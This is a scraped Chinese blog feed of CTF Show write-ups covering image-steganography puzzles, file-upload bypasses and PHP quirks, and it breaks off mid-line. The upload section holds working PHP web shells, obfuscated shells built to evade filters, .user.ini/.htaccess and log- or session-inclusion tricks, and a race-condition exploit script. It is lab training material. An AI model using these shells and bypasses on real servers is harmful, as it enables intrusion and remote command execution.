19 — flag在主机上的文档名里 1.20 misc 20 — flag在评论里图虫查看器 https://exif.tuchong.com/ ctfshow{c97964b1aecf06e1d79c21ddad593e42} 1.21 misc 21 — flag在序号里flag在序号里。 12print(hex(3902939465)+hex(2371618619)+hex(1082452817)+hex(2980145261))0xe8a221490x8d5c073b0x4084eb510xb1a1686d 删掉 0x 即可 1.22 misc22 — flag 在图片里 — 缩略图 — exiftool 设置为平铺之后，可以依稀看出来该图片下方有着黄色的一行，但是点击查看之后又看不出来 这是一种缩略图隐写的方式，叫做thumbnail隐写 exiftool 1exiftool.exe -ThumbnaiImage -b misc22.jpg &gt; 111.jpg ctfshow{dbf7d3f84b0125e833dfd3c80820a129} 1.23 misc23 — flag在时间里 —exiftool 查看实践 1exiftool.exe misc23.psd ctfshow{}, UnixTimestamp, DECtoHEX, getflag Unix 时间戳，十进制到十六进制，获取 flag 1997:09:22 02:17:02+08:00 2055:07:15 12:14:48+08:00 2038:05:05 16:50:45+08:00 1984:08:03 18:41:46+08:00 在线时间戳转换 874865822 2699237688 2156662245 460377706 12print(hex(874865822)+hex(2699237688)+hex(2156662245)+hex(460377706))0x3425649e0xa0e319380x808c0de50x1b70ce6a ctfshow{3425649ea0e31938808c0de51b70ce6a} 1.24 misc41（本题为Misc入门图片篇和愚人节比赛特别联动题）H4ppy Apr1l F001’s D4y！愚人节到了，一群笨蛋往南飞，一会儿排成S字，一会儿排成B字。 H4ppy Apr1l F001’s D4y！ 这是个提示：F001，010 搜索 F001，发现存在大量，组成了刺目的形状，读取出来即可 ctfshow{fcbd427caf4a52f1147ab44346cd1cdd} 1.25 misc24 — flag在图片上面 — bmp 图片改高度bmp 位图文件解析 900*150=135000个像素大小 该图片总共 675056 个字节，文件尾的位置在675053字节处(后面两个字节是windows的”补0”) 文件头共 53 字节 每个像素点由3个字节（十六进制码6位）表示，每个字节负责控制一种颜色，分别为蓝（Blue）、绿（Green）、红（Red） (675053-53)/3=225000 得到真实的像素大小 该题只有高不对，则正确的宽依旧是 900 得到 225000/900=高 250 修改高为 hex(250)=FA 还是 0096 的位置修改 保存得到flag 1.26 misc25 — flag在图片下面 — png 图片改高度 0096 改成 0196 0296 都可 1.27 misc26 — flag还是在图片下面，但到底有多下面？ ctfshow{94aef1 +True height(hex) of this picture+ 087a7ccf2e28e742efd704c} https://blog.csdn.net/weixin_44145452/article/details/109612189 会提示校验码错误 CRC32是有哪些字节构成的？ PNG文件中总是以固定的八个字节开头 89 50 4E 47 0D 0A 1A 0A 数据块长度3 00 00 00 0D 文件头数据块标示IDCH 49 48 44 52 13位数据块（IHDR）下面为宽和高 00 00 07 7E 00 00 03 60 这5个字节依次为Bit depth，ColorType，Compression method，Filter method，Interlace method 08 06 00 00 00 接下来的四字节为该png图片的CRC校验码 7D C7 3F 7F CRC校验码，由IDCH和IHDR共十七位字节进行crc计算得到 解决方法：1.简单点的隐写题，可以直接修改宽高，然后显示flag2.那么如果修改宽高，并不会直接看到flag，需要放入stegsolve里或者做其它的进一步处理时。这里会产生一个问题，那就是修改过宽高的图片stegsolve无法打开，提示IO错误。这是因为png图像的IHDR段中的高宽被修改，导致计算出来的CRC不正确，所以无法正确读取。通过python2脚本来获取图片高度 获取图片高度 1234567891011# -*- coding: utf-8 -*-import binasciiimport structcrc32key = 0x7DC73F7Ffor i in range(0, 65535): height = struct.pack(&#x27;&gt;i&#x27;, i) #CRC: 7DC73F7F data = &#x27;\\x49\\x48\\x44\\x52\\x00\\x00\\x07\\x7E&#x27; + height + &#x27;\\x08\\x06\\x00\\x00\\x00&#x27; crc32result = binascii.crc32(data) &amp; 0xffffffff if crc32result == crc32key: print &#x27;&#x27;.join(map(lambda c: &quot;%02X&quot; % ord(c), height)) 爆破图片正常宽高 1import structimport zlibdef hexStr2bytes(s): b = b&quot;&quot; for i in range(0,len(s),2): temp = s[i:i+2] b +=struct.pack(&quot;B&quot;,int(temp,16)) return bstr1=&quot;49484452&quot; #文件头数据块标示IDCHstr2=&quot;0806000000&quot; #五字节：Bit depth，ColorType，Compression method，Filter method，Interlace methodbytes1=hexStr2bytes(str1)bytes2=hexStr2bytes(str2)wid,hei = 900,150 #宽高 像素crc32 = &quot;0xec9ccbc6&quot; #校验码for w in range(wid,wid+2000): for h in range(hei,hei+2000): width = hex(w)[2:].rjust(8,&#x27;0&#x27;) height = hex(h)[2:].rjust(8,&#x27;0&#x27;) bytes_temp=hexStr2bytes(width+height) if eval(hex(zlib.crc32(bytes1+bytes_temp+bytes2))) == eval(crc32): print(hex(w),hex(h)) ctfshow{94aef1 +True height(hex) of this picture+ 087a7ccf2e28e742efd704c} 1ctfshow&#123;94aef125e087a7ccf2e28e742efd704c&#125; 1.28 misc27 — flag在图片下面 寻找 0096 1.29 misc28 — flag在图片下面 — gif9600 更改为 FF00，两处 gif.bt ??????? 1.30 misc29 — flag在图片下面9600 更改为 FF00，十处，然后 stegsolve 逐帧查看 1.31 misc30 — 正确的宽度是950修改 bmp 宽度为 hex(950) 1.32 misc31 — 高度是正确的，但正确的宽度是多少呢同 misc24 图片总共 487256 字节，去掉文件尾，得到 487253 900*150=135000 文件头 53 字节 (487253-53)/3=162400 高正确，150 宽：162400/150=1082.67 改宽为 1082 1.33 misc32 — 高度是正确的，但正确的宽度是多少呢png 计算宽高 1import structimport zlibdef hexStr2bytes(s): b = b&quot;&quot; for i in range(0,len(s),2): temp = s[i:i+2] b +=struct.pack(&quot;B&quot;,int(temp,16)) return bstr1=&quot;49484452&quot; #文件头数据块标示IDCHstr2=&quot;0802000000&quot; #五字节：Bit depth，ColorType，Compression method，Filter method，Interlace methodbytes1=hexStr2bytes(str1)bytes2=hexStr2bytes(str2)wid,hei = 900,150 #宽高 像素crc32 = &quot;0xe14a4c0b&quot; #校验码for w in range(wid,wid+2000): for h in range(hei,hei+2000): width = hex(w)[2:].rjust(8,&#x27;0&#x27;) height = hex(h)[2:].rjust(8,&#x27;0&#x27;) bytes_temp=hexStr2bytes(width+height) if eval(hex(zlib.crc32(bytes1+bytes_temp+bytes2))) == eval(crc32): print(hex(w),hex(h)) 0x414 0x96 1.34 misc33 — 出题人丧心病狂，把高度也改了1import zlibimport struct# 同时爆破宽度和高度filename = &quot;misc33.png&quot;with open(filename, &#x27;rb&#x27;) as f: all_b = f.read() data = bytearray(all_b[12:29]) n = 4095 for w in range(n): width = bytearray(struct.pack(&#x27;&gt;i&#x27;, w)) for h in range(n): height = bytearray(struct.pack(&#x27;&gt;i&#x27;, h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = zlib.crc32(data) #替换成图片的crc if crc32result == 0x5255a798: print(&quot;宽为：&quot;, end = &#x27;&#x27;) print(width, end = &#x27; &#x27;) print(int.from_bytes(width, byteorder=&#x27;big&#x27;)) print(&quot;高为：&quot;, end = &#x27;&#x27;) print(height, end = &#x27; &#x27;) print(int.from_bytes(height, byteorder=&#x27;big&#x27;)) 宽为：bytearray(b’\\x00\\x00\\x03\\xd2’) 978高为：bytearray(b’\\x00\\x00\\x00\\x8e’) 142 1.35 misc34 — 出题人狗急跳墙，把IHDR块的CRC也改了，但我们知道正确宽度肯定大于9001.36 misc351.37 misc361.38 misc37 — flag在图片里StegSolve 帧图分析 ctfshow{2056782cd57b13261dcbbe3d6eecda17} 1.39 misc38 — flag在图片里 使用浏览器打开，即可发现会动 APNG 图片分解器 ctfshow{48b722b570c603ef58cc0b83bbf7680d} 1.40 misc39 — flag就像水，忽快忽慢地流这题也是一个gif，不过这里是利用不同帧之间的间隔时间来隐写的。 1.41 misc40 — flag就像歌，有长有短仿佛岁月悠悠apng 帧分离，换成了apng的帧时间间隔隐写 1flag=&quot;&quot;for i in range(28,69): #flag内容从28位开始 f = open(&#x27;apngframe&#x27;+str(i)+&#x27;.txt&#x27;) s = f.read() flag += chr(int(s.split(&quot;/&quot;)[0][6:]))print(flag)","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"CTF-Show-文件上传","slug":"CTF-Show-文件上传","date":"2021-10-01T11:16:29.000Z","updated":"2021-10-01T11:17:15.184Z","comments":true,"path":"2021/10/01/CTF-Show-文件上传/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","excerpt":"CTF Show 文件上传篇。","text":"CTF Show 文件上传篇。 CTF Show — 文件上传1.1 Web 151 — 前端验证 手动删除前端验证，好像没什么作用，尝试之后发现，只能成功上传 .png 图片，其实查看源代码后有 所以只能上传 .png ，我们上传 1.png 然后抓包手动修改 蚁剑连接即可 1.2 Web 1521后端不能单一校验 同上 1.3 Web 153 — .user.ini由于服务器是 nginx ，则可尝试上传 .user.ini 再上传 111.png 访问与 111.png 同目录下的 index.php 文件 即 /upload/index.php ，使用 蚁剑连接即可 1.4 Web 154 — 大小写绕过 php这次尝试之后发现进行了内容判断，只能使用图片木马 发现 .user.ini 仍旧可以上传 但是内容过滤了 php ,想办法找一些不含有 php 的一句话 1234567891011121314151617181920212223241:XML风格，也是官方推荐的形式&lt;?php @eval($_POST[1]);?&gt; 2:短标记&lt;? @eval($_POST[1]);?&gt;需要开启配置参数short_open_tags=on&lt;?= @eval($_POST[1]);自 PHP 5.4 起，短格式的 echo 标记 &lt;?= 总会被识别并且合法，而不管 short_open_tag 的设置是什么。&lt;? echo &#x27;123&#x27;;?&gt; //short_open_tags=on&lt;?=(表达式)?&gt; 等价于 &lt;?php echo (表达式)?&gt; //无限制3:ASP风格&lt;% @eval($_POST[1]); %&gt; ASP风格标记仅在通过php.ini配置文件中的指令asp_tags打开后才可用。&lt;% echo &#x27;123&#x27;;%&gt; //asp_tags=on php_version &lt; 74:脚本风格&lt;script language=&quot;php&quot;&gt; echo &quot;666&quot;;&lt;/script&gt; PHP 7.0.0以后失效 本题发现可以大小写进行绕过 蚁剑显示不出具体文件时，尝试进行终端查看 1# 过滤了 php，没过滤大小写 1.5 Web 155 — 短标签绕过 php1# 过滤了 php，过滤了大小写 同上 可使用短标签绕过 php 1.6 Web 156 — { } 代替 [ ]1# 过滤了 php，大小写，[]符号 之后同上 1.7 Web 157-159 — 命令执行1# 过滤了 php，大小写，[]，&#123;&#125;，; 转换思路，不上传一句话了，直接 命令执行 12345&lt;? system(&quot;nl ../f*&quot;)?&gt;&lt;?=(system(&#x27;nl ../f*&#x27;))?&gt;&lt;?= `nl ../*.p*`?&gt;&lt;?= `nl ../f*`?&gt;&lt;?=(system(&#x27;tac ../f*&#x27;))?&gt; 1.8 Web 160 — 日志包含（过滤 log）1# 过滤了 php，大小写，[]，;，``，log 日志包含 条件 知道日志文件的路径 对日志文件可读 1# 上传 .user.iniauto_prepend_file=123.png# 上传 123.png# nginx 服务器&lt;?=include&quot;/var/log/nginx/access.log&quot;?&gt;# 由于 log 被过滤，进行拼接&lt;?=include&quot;/var/l&quot;.&quot;og/nginx/access.l&quot;.&quot;og&quot;?&gt; 将 .user.ini 和 123.png 都成功上传之后，访问 /upload/index.php 抓包在 User-Agent 中添入代码，访问即可 1&lt;?php system(&#x27;cat ../flag.php&#x27;); ?&gt; 流程 访问 /upload/index.php 由于 .user.ini 的配置，将首先自动包含文件 123.png 由于是 包含 文件 123.png ，将会自动执行其中的代码 即包含 /var/log/nginx/access.log 日志文件 而我们再在日志文件当中写入 恶意代码，就将会被执行 1.9 Web 161 — 文件头 GIF89a 写入无法上传 .user.ini 验证了图片内容，即必须包含文件头 在 Web 160 的基础上添加 文件头 GIF89a 或者是 PNG 图片的 文件幻术 1.10 Web 162-163 — session 文件包含继续使用上述 日志 包含，发现上传 .user.ini 时，文件内容 过滤掉了 . 过滤掉了 . session 包含 1# 上传 .user.iniGIF89aauto_prepend_file=test 1# 上传 testGIF89a&lt;?=include&quot;/tmp/sess_test&quot;?&gt; 构造 POST 数据包 1&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://e2f78cd5-b2b8-40b9-8104-7dc18214350b.challenge.ctf.show:8080/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 任意上传一个文件，抓包修改，写入代码，进行爆破 然后访问 /upload/index.php 页面进行抓包，爆破 以上两个包同时进行爆破，得到 flag 流程 上传 .user.ini 上传 test 访问 /upload/index.php ，由于 .user.ini 的配置，首先包含 test 文件，紧接着执行其中代码，即包含 /tmp/sess_test 包含 sess_test ，即执行其中的 php 代码，即显示出 flag.php 1# 脚本# coding=utf-8import ioimport requestsimport threadingsessID = &#x27;test&#x27;url = &#x27;http://04198aac-59f1-406e-a656-1af6186d2ff1.challenge.ctf.show:8080/&#x27;def write(session): while event.isSet(): f = io.BytesIO(b&#x27;a&#x27; * 256 * 1) response = session.post( url, cookies=&#123;&#x27;PHPSESSID&#x27;: sessID&#125;, data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php system(&quot;nl ../*.php&quot;);?&gt;&#x27;&#125;, files=&#123;&#x27;file&#x27;: (&#x27;test.txt&#x27;, f)&#125; )def read(session): while event.isSet(): response = session.get(url + &#x27;upload/index.php&#x27;.format(sessID)) if &#x27;flag&#x27; in response.text: print(response.text) event.clear() else: print(&#x27;[*]retrying...&#x27;)if __name__ == &#x27;__main__&#x27;: event = threading.Event() event.set() with requests.session() as session: for i in range(1, 30): threading.Thread(target=write, args=(session,)).start() for i in range(1, 30): threading.Thread(target=read, args=(session,)).start() 1# 条件竞争# coding=utf-8import requestsimport threadingsession=requests.session()sess=&#x27;test&#x27;url1=&quot;http://04198aac-59f1-406e-a656-1af6186d2ff1.challenge.ctf.show:8080/&quot;url2=&quot;http://04198aac-59f1-406e-a656-1af6186d2ff1.challenge.ctf.show:8080/upload&quot;data1=&#123; &#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;&#125;file=&#123; &#x27;file&#x27;:&#x27;test&#x27;&#125;cookies=&#123; &#x27;PHPSESSID&#x27;: sess&#125;def write(): while True: r = session.post(url1,data=data1,files=file,cookies=cookies)def read(): while True: r = session.get(url2) if &#x27;flag&#x27; in r.text: print(r.text) threads = [threading.Thread(target=write), threading.Thread(target=read)]for t in threads: t.start() 1.11 Web 164 — png 二次渲染1&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123; $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,&#x27;1.png&#x27;);?&gt; 结果生成 1.png ，其中包含 &lt;?=$_GET[0]($_POST[1]);?&gt; 然后访问图片，执行代码后，下载图片查看 因为在下载的时候，看到 url 是 download/?image= ，可能是文件包含，所以可以执行我们的命令 1.12 Web 165 — jpg 二次渲染 首先准备一张 jpg 图片上传，成功后下载回来，使用如下脚本处理，生成一个新的图片马，再次上传 查看，即文件包含，保存到本地打开即可 1&lt;?php $miniPayload = &quot;&lt;?=`tac f*`?&gt;&quot;; //这里改代码 if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123; die(&#x27;php-gd is not installed&#x27;); &#125; if(!isset($argv[1])) &#123; die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;); &#125; set_error_handler(&quot;custom_error_handler&quot;); for($pad = 0; $pad &lt; 1024; $pad++) &#123; $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) &#123; die(&#x27;Incorrect SOI marker&#x27;); &#125; while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123; $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) &#123; $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\\0&quot;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) &#123; while((!$dis-&gt;eof())) &#123; if($dis-&gt;readByte() === 0xFF) &#123; if($dis-&gt;readByte !== 0x00) &#123; break; &#125; &#125; &#125; $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\\0&quot;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); &#125; elseif($correctImage) &#123; $outStream = $outStreamTmp; &#125; else &#123; break; &#125; if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123; die(&#x27;Success!&#x27;); &#125; else &#123; break; &#125; &#125; &#125; &#125; unlink(&#x27;payload_&#x27;.$argv[1]); die(&#x27;Something\\&#x27;s wrong&#x27;); function checkImage($filename, $data, $unlink = FALSE) &#123; global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; &#125; function custom_error_handler($errno, $errstr, $errfile, $errline) &#123; global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(&#x27;/(\\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123; if(isset($m[1])) &#123; $extraBytes = (int)$m[1]; &#125; &#125; &#125; class DataInputStream &#123; private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) &#123; $this-&gt;binData = &#x27;&#x27;; $this-&gt;order = $order; if(!$fromString) &#123; if(!file_exists($filename) || !is_file($filename)) die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;); $this-&gt;binData = file_get_contents($filename); &#125; else &#123; $this-&gt;binData = $filename; &#125; $this-&gt;size = strlen($this-&gt;binData); &#125; public function seek() &#123; return ($this-&gt;size - strlen($this-&gt;binData)); &#125; public function skip($skip) &#123; $this-&gt;binData = substr($this-&gt;binData, $skip); &#125; public function readByte() &#123; if($this-&gt;eof()) &#123; die(&#x27;End Of File&#x27;); &#125; $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); &#125; public function readShort() &#123; if(strlen($this-&gt;binData) &lt; 2) &#123; die(&#x27;End Of File&#x27;); &#125; $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) &#123; $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); &#125; else &#123; $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); &#125; return $short; &#125; public function eof() &#123; return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); &#125; &#125; //使用方法 php exp.php 1.jpg?&gt; 1.13 Web 166 — zip 文件上传 1# Content-Type: application/x-zip-compressed 将一句话木马后缀更改为 zip 上传即可，查看文件 1/upload/download.php?file=9643f09dfc5004a1dc73f4c025f084d2.zip 将代码更改即可 1.14 Web 167 — .htaccess1httpd 尝试 jpg 文件成功上传之后发现服务器是 Apache ，再根据提示，尝试上传 .htaccess 成功上传 1# 上传 111.png&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt; 之后访问 /upload/111.png 蚁剑连接即可 1.15 Web 168 — 免杀代码1基础免杀# 过滤了 eval , system , $_POST , $_GET 等 1# 可使用反引号&lt;?=`ls /var/www/html`?&gt; #flag.php flagaa.php images index.php js layui upload upload.php &lt;?=`cat /var/www/html/flagaa.php`?&gt; 1# 其它绕过方式 1&lt;?php // 使用时请删除此行, 连接密码: TyKPuntU ?&gt;&lt;?php $bFIY=create_function(chr(25380/705).chr(92115/801).base64_decode(&#x27;bw==&#x27;).base64_decode(&#x27;bQ==&#x27;).base64_decode(&#x27;ZQ==&#x27;),chr(0x16964/0x394).chr(0x6f16/0xf1).base64_decode(&#x27;YQ==&#x27;).base64_decode(&#x27;bA==&#x27;).chr(060340/01154).chr(01041-0775).base64_decode(&#x27;cw==&#x27;).str_rot13(&#x27;b&#x27;).chr(01504-01327).base64_decode(&#x27;ZQ==&#x27;).chr(057176/01116).chr(0xe3b4/0x3dc));$bFIY(base64_decode(&#x27;NjgxO&#x27;.&#x27;Tc7QG&#x27;.&#x27;V2QWw&#x27;.&#x27;oJF9Q&#x27;.&#x27;&#x27;.str_rot13(&#x27;G&#x27;).str_rot13(&#x27;1&#x27;).str_rot13(&#x27;A&#x27;).base64_decode(&#x27;VQ==&#x27;).str_rot13(&#x27;J&#x27;).&#x27;&#x27;.&#x27;&#x27;.chr(0x304-0x2d3).base64_decode(&#x27;Ug==&#x27;).chr(13197/249).str_rot13(&#x27;F&#x27;).base64_decode(&#x27;MQ==&#x27;).&#x27;&#x27;.&#x27;B1bnR&#x27;.&#x27;VXSk7&#x27;.&#x27;MjA0N&#x27;.&#x27;TkxOw&#x27;.&#x27;==&#x27;.&#x27;&#x27;));?&gt; 1&lt;?php$a = &quot;s#y#s#t#e#m&quot;;$b = explode(&quot;#&quot;,$a);$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];$c($_REQUEST[1]);?&gt; 1&lt;?php$a=substr(&#x27;1s&#x27;,1).&#x27;ystem&#x27;;$a($_REQUEST[1]);?&gt; 1&lt;?php$a=strrev(&#x27;metsys&#x27;);$a($_REQUEST[1]);?&gt; 1&lt;?php$a=$_REQUEST[&#x27;a&#x27;];$b=$_REQUEST[&#x27;b&#x27;];$a($b);?&gt; 1&lt;?=`$_REQUEST[1]`;?&gt;# 利用反引号执行系统命令 1&lt;?php $a=&#x27;syste&#x27;.&#x27;m&#x27;;($a)(&#x27;ls ../&#x27;);# 拼接 1&lt;?php$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi&#123;abs&#125;)($$pi&#123;acos&#125;);# get传参 abs=system&amp;acos=ls# 数学函数 1.16 Web 169-170 — 日志包含（未过滤 log）1高级免杀 1# 前端做了 .zip 检查# 后端做了 Content-Type 检查 访问 1.php ，我们必须自己上传一个 .php 文件 1system(&#x27;ls ../&#x27;); 1system(&#x27;cat ../flagaa.php&#x27;); 二、总结 找到允许上传的文件类型，抓包 在 Content-Type 正确的情况下，首先尝试直接更改 后缀为 .php ，写入一句话木马 上述不允许的情况下，观察服务器类型，nginx 尝试 .user.ini ，Apache 尝试 .htaccess ```bash.user.iniauto_prepend_file=1.pngauto_prepend_file=testauto_prepend_file=/var/log/nginx/access.log123+ ```bash # .htaccessAddType application/x-httpd-php .png # 特定文件后缀当作 php 文件处理AddHandler php5-script php # 包含关键字的文件名当作 php 文件处理&lt;FilesMatch &quot;文件名&quot;&gt; # 特定文件名当作 php 文件处理SetHandler application/x-httpd-php&lt;/FilesMatch&gt;SetHandler application/x-httpd-php #所有文件后缀都当作 php 文件处理 .user.ini 注意该目录下是否已经含有 .php 文件 过滤 php 1# 大小写绕过# 短标签 过滤 [] 1# &#123;&#125; 绕过 过滤 分号 ; 1# 命令执行&lt;? system(&quot;nl ../f*&quot;)?&gt;&lt;?=(system(&#x27;nl ../f*&#x27;))?&gt;&lt;?= `nl ../*.p*`?&gt;&lt;?= `nl ../f*`?&gt;&lt;?=(system(&#x27;tac ../f*&#x27;))?&gt; 日志包含 1过滤 log Web 160# 上传 .user.iniauto_prepend_file=123.png# 上传 123.png，在其中进行拼接# nginx 服务器&lt;?=include&quot;/var/log/nginx/access.log&quot;?&gt;# 由于 log 被过滤，进行拼接&lt;?=include&quot;/var/l&quot;.&quot;og/nginx/access.l&quot;.&quot;og&quot;?&gt;# 访问 /upload/index.php 抓包在 User-Agent 中添加恶意代码 &lt;?php system(&#x27;cat ../flag.php&#x27;); ?&gt; ，访问 1未过滤 log Web 169 170# 上传 .user.iniauto_prepend_file=/var/log/nginx/access.log# 上传 .php 文件，同时 User-Agent 写入 代码 &lt;?php phpinfo(); ?&gt;&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt;内容随意# 访问，命令执行 .user.ini 上传不了？尝试文件头写入 1GIF89a 过滤 . Web 162-163 1# 即不能包含日志文件，则包含 session 文件# 上传 .user.iniGIF89aauto_prepend_file=test# 上传 testGIF89a&lt;?=include&quot;/tmp/sess_test&quot;?&gt;# 构造 POST 数据包&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://e2f78cd5-b2b8-40b9-8104-7dc18214350b.challenge.ctf.show:8080/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;# 任意上传文件，抓包修改，PHPSESSID=test，写入代码添入变量 Numbers 爆破# 访问 /upload/index.php 添入变量 Numbers 同时爆破 二次渲染 Web 164 165 1png 图片# 脚本生成图片上传，访问，命令执行 &lt;?=$_GET[0]($_POST[1]);?&gt;# 下载至本地查看（文件包含） 1jpg 图片# 直接上传 jpg 图片，下载回来，使用脚本处理，得到新的 jpg 图片，再次上传# 下载至本地查看（文件包含） 后缀类型不可猜测时，.zip 文件上传 Web 166 1# 上传 .zip 文件抓包 Content-Type: application/x-zip-compressed# 内容直接是恶意代码# 找到 .zip 文件路径，进行查看# 命令执行 免杀 Web 168 前端做后缀检测，后端做不同后缀的 Content-Type 检测 注意抓包后修改 Content-Type 为白名单","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"CTF-Show-PHP特性","slug":"CTF-Show-PHP特性","date":"2021-10-01T11:15:08.000Z","updated":"2021-10-01T11:16:09.641Z","comments":true,"path":"2021/10/01/CTF-Show-PHP特性/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-PHP%E7%89%B9%E6%80%A7/","excerpt":"CTF Show PHP 特性篇。","text":"CTF Show PHP 特性篇。 一、CTF Show PHP特性1.1 Web 89 — intval 数组 [ ] 绕过12345678910111213&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if(preg_match(&quot;/[0-9]/&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num))&#123; echo $flag; &#125;&#125; 1?num[]=1 #数组绕过 1.2 Web 90 — intval 取整 — intval(‘4476sasaS’,0)===44761234567891011121314&lt;?php include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num===&quot;4476&quot;)&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125;&#125; 12345678intval ( mixed $var [, int $base = 10 ] ) : intNote:如果 base 是 0，通过检测 var 的格式来决定使用的进制：如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)；否则，如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)；否则，将使用 10 进制 (decimal)。 123456intval(&#x27;4476.0&#x27;)===4476 小数点 intval(&#x27;+4476.0&#x27;)===4476 正负号intval(&#x27;4476e0&#x27;)===4476 科学计数法intval(&#x27;0x117c&#x27;)===4476 16进制intval(&#x27;010574&#x27;)===4476 8进制intval(&#x27; 010574&#x27;)===4476 8进制+空格 123if(intval(&#x27;4476sasaS&#x27;,0)===4476)&#123; echo &#x27;123&#x27;;&#125; 1?num=4476asd 1.3 Web 91 — 正则绕过 — /m 换行匹配1234567891011121314151617&lt;?phpshow_source(__FILE__);include(&#x27;flag.php&#x27;);$a=$_GET[&#x27;cmd&#x27;];if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123; if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123; echo &#x27;hacker&#x27;; &#125; else&#123; echo $flag; &#125;&#125;else&#123; echo &#x27;nonononono&#x27;;&#125;Notice: Undefined index: cmd in /var/www/html/index.php on line 15nonononono 1# 解析换行之后要匹配到 php不换行不能匹配到 php 1i 不区分(ignore)大小写m多(more)行匹配若存在换行\\n并且有开始^或结束$符的情况下，将以换行为分隔符，逐行进行匹配$str = 